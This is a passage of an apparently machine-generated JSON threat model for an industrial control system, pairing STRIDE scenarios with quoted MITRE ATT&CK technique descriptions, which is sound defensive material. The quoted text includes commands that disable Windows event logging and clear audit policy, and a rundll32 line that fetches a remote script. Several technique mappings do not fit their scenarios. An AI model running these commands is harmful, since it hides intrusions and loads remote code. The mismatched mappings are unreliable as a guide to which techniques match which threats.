                    "Condition": "Valid if passwords are weak or default, or if software vulnerabilities are present."
                }
            ],
            "Potential Impact": "Tampering of control logic, potentially unsafe or damaging industrial operations, data integrity issues.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "PLCs",
                "reprogramming",
                "control logic"
            ],
            "mitre_technique": {
                "name": "Modify Control Logic",
                "description": "Adversaries may place malicious code in a system, which can cause the system to malfunction by modifying its control logic. Control system devices use programming languages (e.g. relay ladder logic) to control physical processes by affecting actuators, which cause machines to operate, based on environment sensor readings. These devices often include the ability to perform remote control logic updates. \n\nProgram code is normally edited in a vendor-specific Integrated Development Environment (IDE) that relies on proprietary tools and features. These IDEs allow an engineer to perform host target development and may have the ability to run the code on the machine it is programmed for. The IDE will transmit the control logic to the testing device, and will perform the required device-specific functions to apply the changes and make them active.\n\nAn adversary may attempt to use this host target IDE to modify device control logic. Even though proprietary tools are often used to edit and update control logic, the process can usually be reverse-engineered and reproduced with open-source tools.\n\nAn adversary can de-calibrate a sensor by removing functions in control logic that account for sensor error. This can be used to change a control process without actually spoofing command messages to a controller or device. \n\nIt is believed this process happened in the lesser known over-pressurizer attacks build into Stuxnet. Pressure sensors are not perfect at translating pressure into an analog output signal, but their errors can be corrected by calibration. The pressure controller can be told what the \u201creal\u201d pressure is for given analog signals and then automatically linearize the measurement to what would be the \u201creal\u201d pressure. If the linearization is overwritten by malicious code on the S7-417 controller, analog pressure readings will be \u201ccorrected\u201d during the attack by the pressure controller, which then interprets all analog pressure readings as perfectly normal pressure no matter how high or low their analog values are. The pressure controller then acts accordingly by never opening the stage exhaust valves. In the meantime, actual pressure keeps rising. (Citation: Stuxnet - Langner - 201311)\n\nIn the Maroochy Attack, Vitek Boden gained remote computer access to the control system and altered data so that whatever function should have occurred at affected pumping stations did not occur or occurred in a different way. The software program installed in the laptop was one developed by Hunter Watertech for its use in changing configurations in the PDS computers. This ultimately led to 800,000 liters of raw sewage being spilled out into the community. (Citation: Maroochy - MITRE - 200808)",
                "id": "attack-pattern--e0d74479-86d2-465d-bf36-903ebecef43e",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious code injection into the cloud storage service, resulting in the corruption of long-term data.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient validation and sanitization of data being stored in the cloud.",
                    "Role": "Systems Developer",
                    "Condition": "Valid if input data is not properly checked before storage."
                },
                {
                    "Assumption": "Attacker gains the ability to write or modify data in the cloud storage.",
                    "Role": "Attacker",
                    "Condition": "Valid if cloud credentials are compromised or vulnerabilities exist."
                }
            ],
            "Potential Impact": "Long-term data corruption, loss of historical data integrity, potential analytical errors.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "cloud storage",
                "data injection",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Authorized user denies sending specific control commands to field devices.",
            "Assumptions": [
                {
                    "Assumption": "Lack of logging and auditing for command issuance in the Control Center.",
                    "Role": "System Administrator",
                    "Condition": "Valid if command activities are not logged."
                },
                {
                    "Assumption": "System does not use strong user authentication for sensitive actions.",
                    "Role": "System Developer",
                    "Condition": "Valid if authentication mechanisms are weak or nonexistent for critical actions."
                }
            ],
            "Potential Impact": "Difficulty in attributing actions to users, potential legal and operational issues.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "auditing",
                "control commands"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "User denies having altered MES workflows after a production issue.",
            "Assumptions": [
                {
                    "Assumption": "Weak or no audit trails for workflow changes in the MES system.",
                    "Role": "System Administrator",
                    "Condition": "Valid if the MES does not maintain detailed logs."
                },
                {
                    "Assumption": "Lack of version control for MES workflow rules.",
                    "Role": "System Developer",
                    "Condition": "Valid if MES lacks versioning mechanisms."
                }
            ],
            "Potential Impact": "Lack of accountability in workflow management, potential operational disruptions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "audit trails",
                "workflow changes",
                "MES"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies downloading and executing malware via the HMI.",
            "Assumptions": [
                {
                    "Assumption": "Lack of monitoring for file downloads and executions on the HMI.",
                    "Role": "System Administrator",
                    "Condition": "Valid if HMI activities are not logged or monitored."
                },
                {
                    "Assumption": "Weak endpoint protection on HMI systems.",
                    "Role": "System Developer",
                    "Condition": "Valid if HMI lacks robust antivirus or antimalware solutions."
                }
            ],
            "Potential Impact": "Spread of malware, potential system compromise, legal and forensic challenges.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "file execution",
                "HMI",
                "malware"
            ],
            "mitre_technique": {
                "name": "Rundll32",
                "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",
                "id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
                "technique_id": "T1218.011"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts communication between the gateway and cloud services to extract sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Weak or missing encryption for data in transit.",
                    "Role": "System Administrator",
                    "Condition": "Valid if encryption protocols like TLS are not enforced."
                },
                {
                    "Assumption": "The attacker has network access between the gateway and the cloud.",
                    "Role": "Attacker",
                    "Condition": "Valid if network transmission lines are accessible to the attacker."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive operational data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "interception",
                "encryption",
                "cloud services"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A compromised RTU leaks collected data to external unauthorized parties.",
            "Assumptions": [
                {
                    "Assumption": "Weak local security measures on RTUs.",
                    "Role": "System Administrator",
                    "Condition": "Valid if RTUs do not have strong authentication and encryption."
                },
                {
                    "Assumption": "Attacker has physical or network access to the RTUs.",
                    "Role": "Attacker",
                    "Condition": "Valid if RTUs are situated in accessible locations or the network is compromised."
                }
            ],
            "Potential Impact": "Exposure of operational data collected from field devices.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "RTU",
                "data leakage",
                "network access"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Internal staff improperly accesses and shares sensitive MES data.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient access controls within the MES system.",
                    "Role": "System Administrator",
                    "Condition": "Valid if user roles and permissions are not strictly enforced."
                },
                {
                    "Assumption": "Lack of monitoring for internal data access activities.",
                    "Role": "System Developer",
                    "Condition": "Valid if the system does not have internal activity logs."
                }
            ],
            "Potential Impact": "Unauthorized access and distribution of sensitive production and operational data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "internal access",
                "MES",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the control center with traffic, preventing legitimate commands to RTUs.",
            "Assumptions": [
                {
                    "Assumption": "Lack of rate-limiting and traffic filtering on the control center network.",
                    "Role": "Network Engineer",
                    "Condition": "Valid if the control center is not protected by proper network security measures."
                },
                {
                    "Assumption": "The attacker can send large volumes of traffic.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has sufficient resources to overwhelm the network."
                }
            ],
            "Potential Impact": "Disruption of communication and control operations, potential downtime in industrial processes.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "traffic flooding",
                "control center",
                "network"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infects field devices, causing them to become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate endpoint protection on field devices.",
                    "Role": "System Administrator",
                    "Condition": "Valid if field devices do not have antimalware solutions."
                },
                {
                    "Assumption": "Attacker can deploy malware to the network.",
                    "Role": "Attacker",
                    "Condition": "Valid if the network is susceptible to malware delivery methods."
                }
            ],
            "Potential Impact": "Unavailability of field devices, potential loss of control over industrial processes.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "field devices",
                "endpoint protection"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DoS attack on the cloud services disrupts data processing and storage.",
            "Assumptions": [
                {
                    "Assumption": "Lack of redundancy and failover mechanisms in cloud services.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Valid if the cloud setup does not include resilience features."
                },
                {
                    "Assumption": "The attacker can generate sufficient traffic to overwhelm cloud services.",
                    "Role": "Attacker",
                    "Condition": "Valid if cloud services are accessible to potential attackers."
                }
            ],
            "Potential Impact": "Disruption in data processing and storage, potential data loss or delays in operational analytics.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "cloud services",
                "data processing",
                "traffic flooding"
            ],
            "mitre_technique": {
                "name": "Network Denial of Service",
                "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
                "id": "attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab",
                "technique_id": "T1498"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains admin access to the MES through exploitation of a software vulnerability.",
            "Assumptions": [
                {
                    "Assumption": "Presence of unpatched vulnerabilities in the MES software.",
                    "Role": "System Administrator",
                    "Condition": "Valid if the MES software is outdated or not regularly patched."
                },
                {
                    "Assumption": "The attacker can identify and exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has the resources to discover vulnerabilities."
                }
            ],
            "Potential Impact": "Full control over MES operations, potential data tampering and theft, disruption of production workflows.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability exploitation",
                "MES",
                "admin access"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Unauthorized user gains root access to the gateway, altering data flows and encryption settings.",
            "Assumptions": [
                {
                    "Assumption": "Weak security configurations on the gateway devices.",
                    "Role": "System Administrator",
                    "Condition": "Valid if gateways are not properly secured or configured."
                },
                {
                    "Assumption": "Attacker has the ability to access and exploit gateway configurations.",
                    "Role": "Attacker",
                    "Condition": "Valid if gateway security is not robust enough to prevent exploitation."
                }
            ],
            "Potential Impact": "Alteration of data flows, manipulation of encryption settings, potential exposure and tampering of data in transit.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "root access",
                "gateway",
                "encryption settings"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "User escalates privileges in the cloud service to access restricted data and operations.",
            "Assumptions": [
                {
                    "Assumption": "Misconfigured access control settings in the cloud services.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Valid if access controls are not correctly set up or regularly reviewed."
                },
                {
                    "Assumption": "The attacker can manipulate IAM policies to escalate privileges.",
                    "Role": "Attacker",
                    "Condition": "Valid if IAM policies are exploitable or not sufficiently monitored."
                }
            ],
            "Potential Impact": "Unauthorized access to restricted data, modification of cloud operations and data, potential data theft and corruption.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "cloud services",
                "IAM policies",
                "restricted access"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "13",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate user to access control commands within the Control Center.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has obtained valid user credentials.",
                    "Role": "Attacker",
                    "Condition": "Legitimate user credentials are unprotected or compromised."
                },
                {
                    "Assumption": "System lacks Multi-Factor Authentication (MFA).",
                    "Role": "System Designer",
                    "Condition": "Authentication is solely based on passwords."
                },
                {
                    "Assumption": "Network communications are not properly encrypted.",
                    "Role": "Network Admin",
                    "Condition": "Weak or no encryption is used for control commands."
                }
            ],
            "Potential Impact": "Unauthorized access to control systems, potential disruption of operations.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "impersonation",
                "credential access",
                "network"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
